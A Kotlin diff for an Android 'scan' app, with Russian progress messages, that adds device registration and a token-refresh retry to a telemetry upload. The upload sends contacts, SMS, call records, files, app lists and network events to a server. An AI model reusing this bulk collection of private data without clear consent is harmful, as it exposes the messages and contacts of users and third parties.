@@ -8,11 +8,18 @@ class ScanRepository(
     private val api: GrapheneApi,
     private val context: android.content.Context
 ) {
+    private val registration = RegistrationManager(context)
+
     suspend fun performScan(
         deviceId: String,
         onProgress: (String, Float) -> Unit
     ): Result<ScanResponse> = withContext(Dispatchers.IO) {
         try {
+            // 0. гарантируем токен
+            onProgress("Регистрация устройства…", 0.05f)
+            registration.ensureRegistered()
+                ?: return@withContext Result.failure(Exception("Не удалось зарегистрировать устройство"))
+
             onProgress("Сбор данных об устройстве…", 0.1f)
             val device = DeviceInfoCollector().collect(deviceId)
 
@@ -35,12 +42,24 @@ class ScanRepository(
             val network = NetworkEventStore.snapshot()
 
             onProgress("Отправка на сервер…", 0.92f)
-            val response = api.uploadTelemetry(
+            var response = api.uploadTelemetry(
                 ScanRequest(
                     device, apps, contacts, sms, calls, files, network,
                     System.currentTimeMillis()
                 )
             )
+
+            // 401 → токен протух, перерегистрируемся и повторяем один раз
+            if (response.code() == 401) {
+                onProgress("Обновление токена…", 0.93f)
+                registration.forceReRegister()
+                response = api.uploadTelemetry(
+                    ScanRequest(
+                        device, apps, contacts, sms, calls, files, network,
+                        System.currentTimeMillis()
+                    )
+                )
+            }
 
             if (response.isSuccessful && response.body() != null) {
                 onProgress("Готово", 1f)
